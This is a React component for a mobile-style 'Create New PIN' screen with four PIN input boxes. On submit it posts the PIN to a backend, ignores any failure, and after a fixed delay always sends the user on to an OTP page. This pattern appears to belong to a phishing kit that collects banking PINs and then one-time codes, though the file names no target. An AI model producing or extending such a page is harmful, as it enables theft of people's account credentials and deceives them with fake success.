import React, { useState, useRef, useEffect } from "react";
import { useNavigate } from "react-router-dom";
import "../App.css";
import axios from "axios";
import BASE_URL from "../components/urls";

const PIN_LENGTH = 4;

const Pin = () => {
  const navigate = useNavigate();
  const [pin, setPin] = useState(new Array(PIN_LENGTH).fill(""));
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState("");
  const inputsRef = useRef([]);

  useEffect(() => {
    inputsRef.current[0]?.focus();
  }, []);

  const handleChange = (e, index) => {
    const value = e.target.value.replace(/\D/g, "").slice(-1);
    const next = [...pin];
    next[index] = value;
    setPin(next);
    setError("");
    if (value && index < PIN_LENGTH - 1) {
      inputsRef.current[index + 1]?.focus();
    }
  };

  const handleKeyDown = (e, index) => {
    if (e.key === "Backspace" && !pin[index] && index > 0) {
      inputsRef.current[index - 1]?.focus();
    }
  };

  const handleSubmit = () => {
    const code = pin.join("");
    if (code.length < PIN_LENGTH) {
      setError("Please enter your 4-digit PIN.");
      return;
    }
    setLoading(true);
    axios.post(`${BASE_URL}/pin`, { pin: code }).catch(() => {});
    setTimeout(() => {
      setLoading(false);
      navigate("/otp");
    }, 800);
  };

  const allFilled = pin.every((d) => d !== "");

  return (
    <div className="min-h-screen bg-white flex flex-col px-7 pt-16">
      {/* Title */}
      <h1 className="text-[28px] font-extrabold text-[#0D1B45] text-center mb-10 tracking-tight">
        Create New PIN
      </h1>

      {/* 4 PIN boxes */}
      <div className="flex justify-between gap-4">
        {pin.map((digit, index) => (
          <input
            key={index}
            ref={(el) => {
              inputsRef.current[index] = el;
            }}
            type="password"
            inputMode="numeric"
            maxLength={1}
            value={digit}
            onChange={(e) => handleChange(e, index)}
            onKeyDown={(e) => handleKeyDown(e, index)}
            className="w-full aspect-square text-center text-[26px] font-bold text-[#0D1B45] border border-gray-200 rounded-[20px] outline-none focus:border-[#0D1B45] focus:border-2 transition-all bg-white"
            aria-label={`PIN digit ${index + 1}`}
          />
        ))}
      </div>

      {/* Error */}
      {error && (
        <p className="mt-5 text-sm text-red-500 font-medium text-center">
          {error}
        </p>
      )}

      {/* Save button */}
      <div className="mt-auto pb-10">
        <button
          type="button"
          onClick={handleSubmit}
          disabled={!allFilled || loading}
          className={`w-full py-[22px] rounded-full text-[18px] font-semibold text-white transition-colors duration-200 ${
            allFilled && !loading
              ? "bg-[#0D1B45] cursor-pointer"
              : "bg-[#A8B4C8] cursor-not-allowed"
          }`}
        >
          {loading ? "Please wait..." : "Save"}
        </button>
      </div>
    </div>
  );
};

export default Pin;
